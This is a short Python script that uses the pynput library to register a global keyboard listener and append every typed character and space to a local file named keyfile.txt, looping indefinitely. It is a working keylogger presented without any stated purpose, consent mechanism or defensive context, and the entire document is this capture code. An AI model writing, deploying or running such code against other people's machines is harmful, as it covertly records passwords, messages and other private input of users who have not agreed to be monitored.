from pynput import keyboard
from pynput.keyboard import Key


def keyPressed(key):
    # print(str(key))
    with open('keyfile.txt', 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            if key in [Key.space]:
                with open('keyfile.txt', "a") as text_file:
                    text_file.write(" ")
            else:
                pass


if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    # listener.join()
    listener.start()
    while True:
        pass
    # input()
